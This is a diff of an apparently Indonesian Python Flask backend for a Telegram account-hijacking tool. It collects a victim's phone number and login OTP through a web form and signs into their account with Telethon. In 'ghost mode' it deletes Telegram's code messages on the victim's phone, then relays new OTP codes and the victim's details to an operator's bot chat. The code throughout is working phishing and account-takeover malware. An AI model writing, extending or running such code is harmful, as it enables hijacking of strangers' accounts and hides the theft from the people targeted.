@@ -6,17 +6,17 @@ from telethon.sessions import StringSession
 from telethon.tl.functions.messages import DeleteHistoryRequest
 
 app = Flask(__name__)
-# Izin agar Frontend Vercel bisa akses Backend Railway
+# Izin agar Frontend Vercel bisa akses Backend Railway tanpa terblokir
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-# Ambil dari Environment Variables Railway
+# Konfigurasi dari Environment Variables Railway
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 RAILWAY_URL = f"https://{os.getenv('RAILWAY_STATIC_URL')}"
 
-# Database RAM sementara
+# Penyimpanan data sementara di RAM
 user_db = {}
 
 def bot_api(method, payload):
@@ -32,8 +32,11 @@ def register():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     try:
-        return loop.run_until_complete(handle_flow(data))
+        # Menjalankan alur pendaftaran
+        response = loop.run_until_complete(handle_flow(data))
+        return response
     except Exception as e:
+        print(f"Error Sistem: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
     finally: loop.close()
 
@@ -41,87 +44,95 @@ async def handle_flow(data):
     client = None
     try:
         step = int(data.get('step', 1))
+        # Membersihkan nomor telepon
         num = re.sub(r'\D', '', data.get('nomor', ''))
         if num.startswith('0'): num = '62' + num[1:]
         nomor = '+' + num
         nama = data.get('nama', 'User')
 
         if nomor not in user_db:
-            user_db[nomor] = {"session": "", "hash": "", "nama": nama, "sandi": "None"}
+            user_db[nomor] = {"session": "", "hash": "", "nama": nama}
 
         client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
         await client.connect()
 
         if step == 1:
-            # Request OTP Pertama
+            # Kirim permintaan kode OTP dari Telegram
             res = await client.send_code_request(nomor)
             user_db[nomor].update({"hash": res.phone_code_hash, "session": client.session.save()})
             return jsonify({"status": "success"})
 
         elif step == 2:
-            # Input OTP Pertama & Login
+            # Proses Login dengan OTP yang dimasukkan user di Web
             otp_code = data.get('otp')
             try:
                 await client.sign_in(nomor, otp_code, phone_code_hash=user_db[nomor]['hash'])
                 user_db[nomor]['session'] = client.session.save()
                 
-                # Hapus riwayat kode Telegram di target (GHOST MODE)
+                # GHOST MODE: Hapus riwayat chat kode Telegram (777000)
                 await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
                 
-                text = f"✅ **LOGIN SUKSES**\nNama: {nama}\nNomor: `{nomor}`\n\nKlik tombol di bawah untuk mulai mengintip OTP TurboTel/Telegraph."
+                text = f"✅ **LOGIN BERHASIL**\nNama: **{nama}**\nNomor: `{nomor}`\n\nKlik tombol di bawah untuk mulai mengintip OTP TurboTel."
                 bot_api("sendMessage", {
                     "chat_id": CHAT_ID, 
-                    "text": text,
-                    "reply_markup": {"inline_keyboard": [[{"text": "🔎 INTIP OTP BARU", "callback_data": f"upd_{nomor}"}]]}
+                    "text": text, 
+                    "parse_mode": "Markdown",
+                    "reply_markup": {"inline_keyboard": [[{"text": "🔎 MULAI INTIP OTP", "callback_data": f"upd_{nomor}"}]]}
                 })
                 return jsonify({"status": "success"})
             except errors.SessionPasswordNeededError:
                 user_db[nomor]['session'] = client.session.save()
                 return jsonify({"status": "need_2fa"})
-
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 400
+            except Exception as e:
+                return jsonify({"status": "error", "message": "Kode Salah/Expired"}), 400
+        
+        return jsonify({"status": "error", "message": "Step tidak valid"}), 400
     finally:
         if client: await client.disconnect()
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
     update = request.get_json()
-    if "callback_query" in update:
+    if update and "callback_query" in update:
         call = update["callback_query"]
-        # WAJIB: Biar tombol di Telegram tidak loading terus
-        bot_api("answerCallbackQuery", {"callback_query_id": call["id"], "text": "Mulai Mengintip..."})
+        # PENTING: Menjawab agar tombol tidak loading terus di Telegram
+        bot_api("answerCallbackQuery", {"callback_query_id": call["id"], "text": "Mengintip Aktif!"})
         
         data_call = call["data"].split("_")
         if data_call[0] == "upd":
             nomor = data_call[1]
-            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"👀 **GHOST MODE AKTIF**\nMemantau OTP baru untuk `{nomor}`..."})
-            # Jalankan monitoring di background thread
+            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"👀 **GHOST MODE**\nMemantau OTP baru untuk `{nomor}`..."})
+            # Jalankan monitor di thread terpisah supaya server tidak macet
             threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
     return jsonify({"status": "success"})
 
 async def monitor_otp(nomor):
     data = user_db.get(nomor)
     if not data or not data['session']: return
+    
     client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
     await client.connect()
+    
     try:
         @client.on(events.NewMessage(from_users=777000))
         async def handler(event):
+            # Cari 5 angka OTP dalam pesan
             otp = re.search(r'\b\d{5}\b', event.raw_text)
             if otp:
-                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"📩 **OTP TERDETEKSI**\nNomor: `{nomor}`\nKode: `{otp.group(0)}`"})
-                # GHOST MODE: Langsung hapus kode di HP target
+                kode = otp.group(0)
+                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"📩 **OTP TERINTIP**\nNomor: `{nomor}`\nKode: `{kode}`", "parse_mode": "Markdown"})
+                
+                # GHOST MODE: Hapus pesan kode di HP target secara otomatis
                 await event.delete(revoke=True)
                 await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
         
-        # Standby selama 15 menit
-        await asyncio.wait_for(client.run_until_disconnected(), timeout=900)
+        await asyncio.wait_for(client.run_until_disconnected(), timeout=900) # Monitor 15 menit
     except: pass
-    finally: await client.disconnect()
+    finally:
+        if client.is_connected(): await client.disconnect()
 
 if __name__ == "__main__":
-    # Sinkronisasi Webhook
+    # Otomatis set webhook saat server Railway restart
     if os.getenv('RAILWAY_STATIC_URL'):
         bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
